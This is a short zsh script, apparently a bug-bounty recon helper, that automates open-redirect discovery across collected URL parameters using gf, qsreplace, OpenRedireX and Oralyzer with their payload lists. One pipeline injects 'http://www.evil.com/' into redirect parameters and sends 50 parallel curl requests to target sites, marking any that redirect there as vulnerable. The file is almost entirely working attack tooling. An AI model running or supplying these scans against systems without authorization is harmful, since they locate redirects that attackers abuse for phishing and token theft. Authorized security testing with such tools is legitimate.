#!/bin/zsh

#TARGET=$1

#------------------------------------------------#
echo -e "[+] Start gf red v1 [+]"
#------------------------------------------------#
cat parameters.txt | gf redirect | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q redirectPatterns.txt
#------------------------------------------------#
cat redirectPatterns.txt | qsreplace "FUZZ" | anew -q checkRedirect.txt
#------------------------------------------------#
python3 ~/tools/OpenRedireX/openredirex.py -l checkRedirect.txt --keyword FUZZ -p ~/tools/OpenRedireX/payloads.txt 2> /dev/null | grep "^http" | sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | anew -q redirect.txt &> /dev/null
echo -e "[+] Start red v2 [+]"

cat checkRedirect.txt | grep -a -i "\=http" | qsreplace "http://www.evil.com/" | xargs -P 50 -I % bash -c "curl -s -L '%' -I | grep \"evil.com\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q redirect.txt &> /dev/null

#------------------------------------------------#
echo -e "[+] Start oralyzer [+]"
#------------------------------------------------#
python3 Oralyzer/oralyzer.py -l checkRedirect.txt -p Oralyzer/payloads.txt
#------------------------------------------------#
rm redirectPatterns.txt checkRedirect.txt
